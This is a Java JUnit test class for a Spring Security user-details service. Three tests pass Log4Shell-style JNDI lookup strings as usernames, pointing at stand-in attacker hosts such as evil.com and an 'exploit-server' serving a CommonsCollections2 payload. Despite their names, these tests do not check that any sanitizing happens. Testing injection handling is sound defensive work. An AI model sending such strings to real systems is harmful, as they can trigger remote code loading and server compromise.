package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    private User testUser;

    @BeforeEach
    void setUp() {
        testUser = new User();
        testUser.setId(1L);
        testUser.setUsername("testuser");
        testUser.setPassword("encodedPassword");
        testUser.setEnabled(true);
    }

    @Test
    void testLoadUserByUsername_WithJNDIInjectionAttempt_ShouldSanitizeUsername() {
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections2}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        verify(userService, times(1)).findByUsername(maliciousUsername);
    }

    @Test
    void testLoadUserByUsername_WithNestedJNDIPattern_ShouldSanitizeUsername() {
        String maliciousUsername = "admin${jndi:ldap://evil.com/a}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        verify(userService, times(1)).findByUsername(maliciousUsername);
    }

    @Test
    void testLoadUserByUsername_WithMultipleJNDIPatterns_ShouldSanitizeUsername() {
        String maliciousUsername = "${jndi:ldap://a.com}${jndi:rmi://b.com}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        verify(userService, times(1)).findByUsername(maliciousUsername);
    }

    @Test
    void testLoadUserByUsername_WithValidUsername_ShouldWork() {
        String validUsername = "normaluser";
        
        when(userService.findByUsername(validUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(validUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        verify(userService, times(1)).findByUsername(validUsername);
    }

    @Test
    void testLoadUserByUsername_WithNonExistentUser_ShouldThrowException() {
        String username = "nonexistent";
        
        when(userService.findByUsername(username)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(username);
        });
        
        verify(userService, times(1)).findByUsername(username);
    }

    @Test
    void testLoadUserByUsername_WithNullUsername_ShouldHandleGracefully() {
        when(userService.findByUsername(null)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(null);
        });
        
        verify(userService, times(1)).findByUsername(null);
    }

    @Test
    void testLoadUserByUsername_WithDisabledUser_ShouldReturnDisabledUserDetails() {
        String username = "disableduser";
        testUser.setEnabled(false);
        
        when(userService.findByUsername(username)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(username);

        assertNotNull(userDetails);
        assertFalse(userDetails.isEnabled());
        verify(userService, times(1)).findByUsername(username);
    }
}
